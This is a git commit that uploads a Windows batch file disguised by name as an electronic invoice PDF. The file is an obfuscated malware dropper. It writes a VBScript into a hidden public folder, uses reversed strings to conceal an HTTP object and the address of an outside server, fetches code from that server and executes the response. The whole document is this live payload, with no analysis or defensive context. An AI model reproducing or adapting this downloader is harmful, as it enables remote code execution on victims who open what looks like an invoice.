eb7e6ae2c9e55891bdb88125a660b9fdaea9295f
secretamaster <45047553+secretamaster@users.noreply.github.com>
2018-12-03 16:21:55 -0200

    Add files via upload

---
+++ Nfe-20185162534165243-pdf.cmd
@@ -0,0 +1,27 @@
+@echo off
+setlocal EnableExtensions DisableDelayedExpansion
+if exist %public%\a92m9uZ goto hc8XLSj
+md "%PUBLIC%\a92m9uZ" && cls
+set jc8XLSj=%USERNAME%.vbs
+set iXRaj93="%PUBLIC%\a92m9uZ\%jc8XLSj%" ECHO
+:Fase1
+>>%iXRaj93% Dim bRQjau3
+>>%iXRaj93% Dim cT12DLj
+>>%iXRaj93% Dim dYcuG0y
+>>%iXRaj93% Dim eUHJJdm
+>>%iXRaj93% Dim fJN8ISO
+>>%iXRaj93% Dim gLgxdYK
+>>%iXRaj93% Dim hLgxdYK
+>>%iXRaj93% cT12DLj = WScript.Arguments(0)
+>>%iXRaj93% dYcuG0y = WScript.Arguments(1)
+>>%iXRaj93% Set bRQjau3 = CreateObject(StrReverse("PTTHLMX.2LMXSM"))
+>>%iXRaj93% bRQjau3.open StrReverse(cT12DLj), StrReverse(dYcuG0y), False
+>>%iXRaj93% execute("bRQjau3.setRequestHeader ""User-Agent"", ""5M7yC7u0stom3U0se4r"":bRQjau3.setRequestHeader ""content-type"", ""application/x-www-form-urlencoded""")
+>>%iXRaj93% execute("bRQjau3.send :eUHJJdm = bRQjau3.responseText")
+>>%iXRaj93% execute( eUHJJdm )
+cls
+@echo off
+ping 127.0.0.1 -n 1 > nul
+start wscript //Nologo "%PUBLIC%\a92m9uZ\%jc8XLSj%" AS111 "moc.amallamai.sacepotuasaiog//:ptth" && @echo off
+endlocal
+:hc8XLSj
